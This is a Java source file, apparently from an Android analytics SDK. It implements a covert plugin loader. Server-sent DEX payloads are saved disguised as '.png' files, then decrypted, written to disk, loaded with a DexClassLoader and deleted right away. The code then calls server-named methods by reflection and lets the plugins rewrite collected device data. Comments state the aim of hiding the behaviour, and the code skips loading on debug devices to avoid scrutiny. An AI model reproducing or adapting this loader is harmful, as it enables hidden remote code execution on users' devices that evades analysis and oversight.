package com.analysys.track.utils;

import android.text.TextUtils;
import android.util.Pair;

import com.analysys.track.BuildConfig;
import com.analysys.track.internal.content.EGContext;
import com.analysys.track.internal.impl.DeviceImpl;
import com.analysys.track.internal.model.PsInfo;
import com.analysys.track.utils.data.EncryptUtils;
import com.analysys.track.utils.data.MaskUtils;
import com.analysys.track.utils.data.Md5Utils;
import com.analysys.track.utils.data.Memory2File;
import com.analysys.track.utils.reflectinon.ClazzUtils;
import com.analysys.track.utils.reflectinon.DebugDev;
import com.analysys.track.utils.reflectinon.PatchHelper;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

public class PsHelper {
    public static final String TAG = "PluginHandler";

    public static final String DATA_LOCATION = "DL";
    public static final String DATA = "DT";
    public static final String TOKEN = "TK";
    public static final String DATA_TYPE = "DTT";

    public static final String DATA_TYPE_UPD = "UPD";
    public static final String DATA_TYPE_ADD = "ADD";
    public static final String DATA_TYPE_DEL = "DEL";

    private static volatile PsHelper instance = null;
    /**
     * ps ==> version , classloader
     */
    private Map<String, Object> classLoaderMap;

    private PsHelper() {
        classLoaderMap = new HashMap<>();
    }

    public static PsHelper getInstance() {
        if (instance == null) {
            synchronized (PsHelper.class) {
                if (instance == null) {
                    instance = new PsHelper();
                }
            }
        }
        return instance;
    }


    /**
     * 将策罗解析问ps信息对象
     *
     * @param serverPolicy 策略json
     * @return 剔除data（因为可能比较大，已经缓存文件没必要存在内存）的PsInfo列表，如果策略不包含ps节点，则返回空
     */
    private List<PsInfo> parserPs(JSONObject serverPolicy) {
        if (serverPolicy == null) {
            return null;
        }
        if (!serverPolicy.has("ps")) {
            return null;
        }
        try {
            JSONArray jsonArray = (JSONArray) serverPolicy.opt("ps");
            List<PsInfo> psInfos = new ArrayList<>(jsonArray.length());
            //删除旧的ps包
            FileUitls.getInstance(EContextHelper.getContext()).deleteFile(new File(EContextHelper.getContext().getFilesDir().getAbsolutePath()
                    + EGContext.PS_CACHE_HOTFIX_DIR));
            //解析并存储新ps包
            for (int i = 0; i < jsonArray.length(); i++) {
                PsInfo psInfo = PsInfo.fromJson(jsonArray.getJSONObject(i));
                //  验证文件
                String sign = Md5Utils.getMD5(psInfo.getData() + "@" + psInfo.getVersion()).toLowerCase();
                if (!psInfo.getSign().contains(sign)) {
                    continue;
                }
                //存文件
                File file = new File(
                        EContextHelper.getContext().getFilesDir().getAbsolutePath()
                                + EGContext.PS_CACHE_HOTFIX_DIR,
                        "ps_v" + psInfo.getVersion() + ".png");
                //戴上面具并直接落文件
                MaskUtils.wearMask(file, psInfo.getData().getBytes("utf-8"));
                //设置savePath
                psInfo.setSavePath(file.getAbsolutePath());
                //消除data内容，减少存储内容
                psInfo.setData(null);
                psInfos.add(psInfo);
            }
            return psInfos;
        } catch (Throwable e) {
            if (BuildConfig.ENABLE_BUG_REPORT) {
                BugReportForTest.commitError(e);
            }
        }
        return null;
    }

    /**
     * 保存ps节点的调用信息，目前是存到ps，考虑可以加密存单独文件，区别不大
     *
     * @param psInfos 要存储的ps调用信息
     */
    private void save(List<PsInfo> psInfos) {
        if (psInfos == null) {
            return;
        }
        try {
            JSONArray jsonArray = new JSONArray();
            for (int i = 0; i < psInfos.size(); i++) {
                jsonArray.put(psInfos.get(i).toJson());
            }
            String psJson = jsonArray.toString(0);
            psJson = EncryptUtils.encrypt(EContextHelper.getContext(), psJson);
            File file = getPsIndexFile();
            MaskUtils.wearMask(file, psJson.getBytes("UTF-8"));
            // SPHelper.setStringValue2SP(EContextHelper.getContext(), EGContext.SP_DEX_PS, psJson);
        } catch (Throwable e) {
            if (BuildConfig.ENABLE_BUG_REPORT) {
                BugReportForTest.commitError(e);
            }
        }
    }

    private File getPsIndexFile() {
        try {
            String pkg = DeviceImpl.getInstance(EContextHelper.getContext())
                    .getApplicationPackageName();
            if (pkg == null) {
                pkg = "app_package";
            }
            pkg = Md5Utils.getMD5(pkg).toLowerCase().trim();
            return new File(EContextHelper.getContext().getFilesDir().getAbsolutePath()
                    + EGContext.PS_CACHE_HOTFIX_DIR,
                    pkg + ".png");
        } catch (Throwable e) {
            if (BuildConfig.ENABLE_BUG_REPORT) {
                BugReportForTest.commitError(e);
            }
        }
        return null;
    }

    /**
     * 加载并运行调用信息，如果包含多个调用，则只用同一个classloader
     *
     * @param info 调用信息记录
     */
    private void load(PsInfo info) {
        try {
            if (info == null) {
                return;
            }

            Object loader = classLoaderMap.get(info.getVersion());
            if (loader == null) {
                loader = prepare(info);
                if (loader == null) {
                    return;
                }
                //是否兼容
                boolean b = PluginHandlerHelper.compatible(loader, BuildConfig.SDK_VERSION);
                if (b) {
                    classLoaderMap.put(info.getVersion(), loader);
                } else {
                    // DEX不兼容处理
                    // 调用清理接口
                    PluginHandlerHelper.clearData(loader);
                    // 删除面具文件
                    FileUitls.getInstance(EContextHelper.getContext()).deleteFileAtFilesDir(info.getSavePath());
                }
            }
        } catch (Throwable e) {
            if (BuildConfig.ENABLE_BUG_REPORT) {
                BugReportForTest.commitError(e);
            }
        }
    }

    private void runConfigmds(PsInfo info, Object loader) {
        if (loader == null) {
            return;
        }
        List<PsInfo.MdsBean> mdsBeans = info.getMds();
        if (mdsBeans == null) {
            return;
        }
        for (int j = 0; j < mdsBeans.size(); j++) {
            PsInfo.MdsBean mdsBean = mdsBeans.get(j);
            if (mdsBean == null) {
                continue;
            }
            //非开启状态不调用
            if (!mdsBean.getType().equals("1")) {
                continue;
            }
            PatchHelper.tryLoadMethod(loader, EContextHelper.getContext(), mdsBean.getCn(), mdsBean.getMn(), mdsBean.getCg(), mdsBean.getAs(), null);
        }
    }

    private Object prepare(PsInfo info) {
        try {
            //戴面具的dex原始数据路径
            File maskRawDexFile = new File(info.getSavePath());
            if (!maskRawDexFile.exists() || !maskRawDexFile.isFile() || maskRawDexFile.length() == 0) {
                //索引存在，但dex被删除了,清除策略，下次上传会重新下载
                //SPHelper.removeKey(EContextHelper.getContext(), UploadKey.Response.RES_POLICY_VERSION);
                return null;
            }
            //摘掉dex原始数据的面具
            byte[] data = MaskUtils.takeOffMask(maskRawDexFile);
            if (data == null) {
                return null;
            }
            //原始数据验签
            String sign = Md5Utils.getMD5(new String(data, "utf-8") + "@" + info.getVersion()).toLowerCase();
            if (!info.getSign().contains(sign)) {
                return null;
            }
            //dex原始加密数据解密
            byte[] dexBytes = Memory2File.decode(data);
            //名称与面具文件不同
            File file = new File(
                    EContextHelper.getContext().getFilesDir().getAbsolutePath()
                            + EGContext.PS_CACHE_HOTFIX_DIR,
                    Md5Utils.getMD5(info.getVersion() + "ps") + ".dex");
            //真实的dex文件落地
            Memory2File.writeFile(dexBytes, file);
            //获得一个classloader，这里使用object，是为了隐藏行为
            Object loader = ClazzUtils.g().getDexClassLoader(EContextHelper.getContext(), file.getAbsolutePath());
            //内存读入后，立即删除
            FileUitls.getInstance(EContextHelper.getContext()).deleteFile(file);
            return loader;
        } catch (Throwable e) {
            if (BuildConfig.ENABLE_BUG_REPORT) {
                BugReportForTest.commitError(e);
            }
        }
        return null;
    }

    /**
     * 加载并运行所有的调用信息
     *
     * @param psInfos 要运行的调用信息
     */
    private void loads(List<PsInfo> psInfos) {
        try {
            if (psInfos == null) {
                return;
            }
            for (int i = 0; i < psInfos.size(); i++) {
                PsInfo item = psInfos.get(i);
                load(item);
            }
        } catch (Throwable e) {
            if (BuildConfig.ENABLE_BUG_REPORT) {
                BugReportForTest.commitError(e);
            }
        }
    }

    /**
     * 自动从sp中获取所有的调用信息，并在工作线程执行，调用时机是SDK初始化和策略下发完毕
     */
    public void loadsFromCache() {
        //在工作线程工作，防止阻塞
        SystemUtils.runOnWorkThread(new Runnable() {
            @Override
            public void run() {
                try {
                    List<PsInfo> psInfos = getPsInfosByCache();
                    preperPluginLoader(psInfos);
                    for (int i = 0; i < psInfos.size(); i++) {
                        PsInfo info = psInfos.get(i);
                        Object o = classLoaderMap.get(info.getVersion());
                        if (o != null) {
                            runConfigmds(info, o);
                        }
                    }
                } catch (Throwable e) {
                }

            }
        });

    }

    private boolean preperPluginLoaderEd = false;

    private void preperPluginLoader() {
        if (preperPluginLoaderEd) {
            return;
        }
        preperPluginLoader(getPsInfosByCache());
    }

    private void preperPluginLoader(List<PsInfo> psInfos) {
        try {
            if (preperPluginLoaderEd) {
                return;
            }
            if (DebugDev.get(EContextHelper.getContext()).isDebugDevice()) {
                return;
            }
            if (psInfos == null) {
                return;
            }
            loads(psInfos);
            preperPluginLoaderEd = true;
        } catch (Throwable e) {
            if (BuildConfig.ENABLE_BUG_REPORT) {
                BugReportForTest.commitError(e);
            }
        }
    }

    private List<PsInfo> getPsInfosByCache() {
        try {
            String json = new String(MaskUtils.takeOffMask(getPsIndexFile()), "utf-8");
            json = EncryptUtils.decrypt(EContextHelper.getContext(), json);
            if (TextUtils.isEmpty(json)) {
                return null;
            }
            JSONArray jsonArray = new JSONArray(json);
            List<PsInfo> psInfos = new ArrayList<>(jsonArray.length());
            for (int i = 0; i < jsonArray.length(); i++) {
                PsInfo psInfo = PsInfo.fromJson(jsonArray.getJSONObject(i));
                psInfos.add(psInfo);
            }
            return psInfos;
        } catch (Throwable e) {
            return null;
        }
    }

    /**
     * 解析并保存策略下发的ps节点，如果当前设备未调试设备，则不存储，也不加载
     *
     * @param serverPolicy 策略信息
     */
    public void parserAndSave(JSONObject serverPolicy) {
        try {
            //可信设备操作
            if (DebugDev.get(EContextHelper.getContext()).isDebugDevice()) {
                return;
            }
            save(parserPs(serverPolicy));
        } catch (Throwable e) {
            if (BuildConfig.ENABLE_BUG_REPORT) {
                BugReportForTest.commitError(e);
            }
        }
    }


    /**
     * 给所有已经加载的插件发布一个事件，data是参数也是传值渠道。
     *
     * @param data 事件需要处理的数据
     */
    public void getPluginData(JSONObject data) {
        try {
            preperPluginLoader();
            for (Map.Entry<String, Object> item :
                    classLoaderMap.entrySet()) {
                try {
                    List<Map<String, Object>> list =
                            PluginHandlerHelper.getData(item.getValue());
                    if (list == null) {
                        return;
                    }
                    for (int i = 0; i < list.size(); i++) {
                        Map<String, Object> map = list.get(i);
                        //数据类型，增删改 ADD，DEL，UPD
                        String dataType = (String) map.get(DATA_TYPE);
                        //数据塞到哪里，与DevInfo同级，~，DevInfo级别或DevInfo以下级别，DevInfo/xxx
                        String dataLocation = (String) map.get(DATA_LOCATION);
                        //解密方式|key|当前数据集标识（可空）
                        String token = (String) map.get(TOKEN);
                        //数据体raw
                        String itemData = (String) map.get(DATA);
                        boolean b = checkData(dataType, dataLocation, token, itemData);
                        if (!b) {
                            continue;
                        }
                        //根据位置，找到数据调整靶点
                        JSONObject object = findByLocation(data, dataLocation);
                        itemData = decData(token, itemData);
                        //根据数据类型，对靶点进行操作
                        processObject(dataType, object, itemData);
                    }
                } catch (Throwable e) {
                    //某个插件异常不能影响其他插件
                    if (BuildConfig.logcat) {
                        ELOG.e(BuildConfig.tag_hotfix, "ps 插件：" + item.getKey() + "获取数据异常");
                    }
                }
            }

        } catch (Throwable e) {
            if (BuildConfig.ENABLE_BUG_REPORT) {
                BugReportForTest.commitError(e);
            }
        }
    }

    private String decData(String token, String itemData) {
        return EncUtils.dec(new Pair<String, String>(token, itemData));
    }

    private void processObject(String type, JSONObject home, String data) {
        try {
            JSONObject object1 = new JSONObject(data);
            Iterator<String> strings = object1.keys();
            while (strings.hasNext()) {
                String next = strings.next();
                if (next == null) {
                    continue;
                }
                Object value = object1.get(next);
                if (DATA_TYPE_ADD.equals(type)) {
                    if (!home.has(next)) {
                        home.putOpt(next, value);
                    }
                } else if (DATA_TYPE_DEL.equals(type)) {
                    if (home.has(next)) {
                        home.remove(next);
                    }
                } else if (DATA_TYPE_UPD.equals(type)) {
                    if (home.has(next)) {
                        home.putOpt(next, value);
                    }
                } else {
                    // 不处理
                }
            }
        } catch (Throwable e) {
        }
    }

    /**
     * 校验传来的数据是否合法
     */
    private boolean checkData(String dataType, String dataLocation, String token, String itemData) {
        if (TextUtils.isEmpty(dataType) || TextUtils.isEmpty(dataLocation)) {
            return false;
        }
        //禁止添加太多数据
        if (itemData.length() > (1024 * 1024)) {
            return false;
        }
        return true;
    }

    private JSONObject findByLocation(JSONObject home, String dataLocation) {
        try {
            if ("~".equals(dataLocation)) {
                return home;
            } else {
                JSONObject object = null;
                String[] paths = dataLocation.split("/");
                for (int i = 0; i < paths.length; i++) {
                    object = home.getJSONObject(paths[i]);
                }
                return object;
            }
        } catch (Throwable e) {
            return null;
        }

    }

    public void startAllPlugin() {
        preperPluginLoader();
        for (Map.Entry<String, Object> item :
                classLoaderMap.entrySet()) {
            PluginHandlerHelper.start(item.getValue());
        }
    }

    public void stopAllPlugin() {
        preperPluginLoader();
        for (Map.Entry<String, Object> item :
                classLoaderMap.entrySet()) {
            PluginHandlerHelper.stop(item.getValue());
        }
    }

    public void clearPluginData() {
        preperPluginLoader();
        for (Map.Entry<String, Object> item :
                classLoaderMap.entrySet()) {
            PluginHandlerHelper.clearData(item.getValue());
        }
    }

    private static class PluginHandlerHelper {
        public static boolean clearData(Object pluginLoader) {
            try {
                Class pluginHandler = ClazzUtils.g().getClass("com.analysys.PluginHandler", pluginLoader);
                Object pluginHandlerInstance = ClazzUtils.g().invokeStaticMethod(pluginHandler, "getInstance");
                boolean result = (boolean) ClazzUtils.g().invokeObjectMethod(pluginHandlerInstance, "clearData");
                return result;
            } catch (Throwable e) {
            }
            return false;
        }

        public static List<Map<String, Object>> getData(Object pluginLoader) {
            try {
                Class pluginHandler = ClazzUtils.g().getClass("com.analysys.PluginHandler", pluginLoader);
                Object pluginHandlerInstance = ClazzUtils.g().invokeStaticMethod(pluginHandler, "getInstance");
                List<Map<String, Object>> list = (List<Map<String, Object>>) ClazzUtils.g().invokeObjectMethod(pluginHandlerInstance, "getData");
                return list;
            } catch (Exception e) {
                return null;
            }
        }

        public static boolean compatible(Object pluginLoader, String jarVersion) {
            try {
                Class pluginHandler = ClazzUtils.g().getClass("com.analysys.PluginHandler", pluginLoader);
                Object pluginHandlerInstance = ClazzUtils.g().invokeStaticMethod(pluginHandler, "getInstance");
                boolean result = (boolean) ClazzUtils.g().invokeObjectMethod(pluginHandlerInstance,
                        "compatible",
                        new Class[]{String.class}
                        , new Object[]{jarVersion});
                return result;
            } catch (Throwable e) {
            }
            return false;
        }

        public static boolean stop(Object pluginLoader) {
            try {
                Class pluginHandler = ClazzUtils.g().getClass("com.analysys.PluginHandler", pluginLoader);
                Object pluginHandlerInstance = ClazzUtils.g().invokeStaticMethod(pluginHandler, "getInstance");
                boolean result = (boolean) ClazzUtils.g().invokeObjectMethod(pluginHandlerInstance, "stop");
                return result;
            } catch (Throwable e) {
            }
            return false;
        }

        public static boolean start(Object pluginLoader) {
            try {
                Class pluginHandler = ClazzUtils.g().getClass("com.analysys.PluginHandler", pluginLoader);
                Object pluginHandlerInstance = ClazzUtils.g().invokeStaticMethod(pluginHandler, "getInstance");
                boolean result = (boolean) ClazzUtils.g().invokeObjectMethod(pluginHandlerInstance, "start");
                return result;
            } catch (Throwable e) {
            }
            return false;
        }
    }

}
